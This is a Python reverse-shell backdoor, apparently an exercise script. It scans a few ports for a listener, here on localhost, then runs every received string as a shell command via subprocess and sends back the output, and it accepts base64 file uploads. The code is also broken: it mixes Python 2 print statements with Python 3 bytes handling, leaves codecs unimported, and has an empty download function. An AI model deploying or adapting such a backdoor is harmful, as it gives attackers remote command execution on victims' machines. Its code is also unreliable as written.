from __future__ import print_function
import socket
import time
import subprocess


def upload(mysocket):
    mysocket.send(b"What is the name of the file you are uploading?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"What unique string will end the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(b"Transmit the file as a base64 encoded string followed by the end of transmission string.\n")
    data = b""
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(fname.strip(), "w")
        fh.write(codecs.decode(data[:-len(endoffile)], "base64").decode("latin-1"))
        fh.close()
    except Exception as e:
        mysocket.send("An error occured uploading file {0}. {1}".format(fname, str(e)).encode())
    else:
        mysocket.send(fname + b" successfully uploaded")


def download(mysocket):
    # send a message asking for the filename
    # receive the filename
    # send a reminder that the file will be base64 encrypted and what the end of file marker is
    # try:
    # read the file from the hard drive
    # BASE64 encode the data from the file and add the end of file marker
    # send the data across the socket
    # except:
    # send an error message


def scan_and_connect():
    print "it started"
    connected = False
    while not connected:
        for port in [21, 22, 81, 443, 8000]:
            time.sleep(1)
            try:
                print "Trying", port,

                mysocket.connect(("127.0.0.1", port))
            except socket.error:
                print "Nope"
                continue
            else:
                print "Connected"
                connected = True
                break

mysocket = socket.socket()
scan_and_connect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode()
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            scan_and_connect()
            continue
        if commandrequested[:4] == "QUIT":
            mysocket.send("Terminating Connection.")
            break
        if commandrequested[:6] == "UPLOAD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNLOAD":
            download(mysocket)
            continue
        prochandle = subprocess.Popen(
            commandrequested,  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results, errors = prochandle.communicate()
        results = results + errors
        mysocket.send(results.encode())
    except socket.error:
        break
    except Exception as e:
        mysocket.send(str(e).encode())
        break
